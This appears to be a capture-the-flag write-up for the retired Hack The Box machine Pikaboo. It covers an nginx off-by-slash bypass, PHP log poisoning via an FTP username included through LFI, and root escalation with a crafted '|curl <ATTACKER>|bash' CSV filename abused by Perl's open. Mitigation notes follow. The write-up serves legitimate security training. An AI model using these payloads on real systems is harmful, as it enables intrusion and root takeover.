---
machine: Pikaboo
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, nginx, off-by-slash, lfi, log-poisoning, perl]
---

# Pikaboo — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Nginx has an `alias`/`proxy_pass` without a trailing slash, enabling an off-by-slash into the admin panel. The panel queries LDAP and leaks FTP credentials; use them to poison the vsftpd log and include it via LFI to run PHP. A root cron processes CSV with Perl and `open`, and a file named `|command;.csv` in the FTP directory runs as root.

## Recon

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- `21/tcp` vsftpd, `22/tcp` OpenSSH on Debian and `80/tcp` nginx.
- `feroxbuster` finds `/admin.php` returning `403` and `/images`.
- nginx fronts Apache; the admin panel is proxied.

## Enumeration

- `/admin../admin_staging/index.php` bypasses the nginx rule and loads the panel.
- The panel queries LDAP and returns base64 passwords for `pwnmeow` and `binduser`.
- `pwnmeow` is in the `ftp` group and can write under `/srv/ftp/*`.

## Foothold

Log in over FTP as `pwnmeow`, poison the log with PHP in the username and include `/var/log/vsftpd.log` through the panel LFI to run a reverse shell.

```bash
ftp <IP>
# username: <?php system($_GET['cmd']); ?>
curl 'http://<IP>/admin../admin_staging/index.php?page=/var/log/vsftpd.log&cmd=id'
```

## Lateral movement

The shell is `www-data`. `pwnmeow`'s `ftp` group allows writing files into the directories processed by cron; no other user is needed for escalation.

## Privilege escalation

The `/usr/local/bin/csvupdate_cron` job runs a Perl script that opens `*.csv` with `open`. A name starting with `|` executes the rest as a command; upload `|curl <ATTACKER>|bash; a.csv` over FTP and cron runs it as root.

```bash
ftp> put test.txt "|curl <ATTACKER>|bash; a.csv"
# wait for cron and catch the root shell
```

## Evidence

- Off-by-slash `/admin../admin_staging/` and LDAP credentials.
- Poisoned vsftpd log and `www-data` shell.
- `|...;.csv` file executed by the root cron.

## Lessons learned

- A `proxy_pass` without a trailing slash can enable traversal.
- Writable logs with user input are an LFI-to-RCE vector.
- Perl `open` with filenames allows command injection.

## Mitigation and detection

- Add trailing slashes and normalize paths in nginx.
- Do not include logs in pages and sanitize FTP input.
- Use three-argument `open` and explicit lists in Perl scripts.

## References

- [0xdf — Pikaboo](https://0xdf.gitlab.io/2021/12/04/htb-pikaboo.html)
- [IppSec — Pikaboo](https://www.youtube.com/watch?v=4tXFHoeOytE)
- [Hack The Box — Pikaboo](https://app.hackthebox.com/machines/pikaboo)
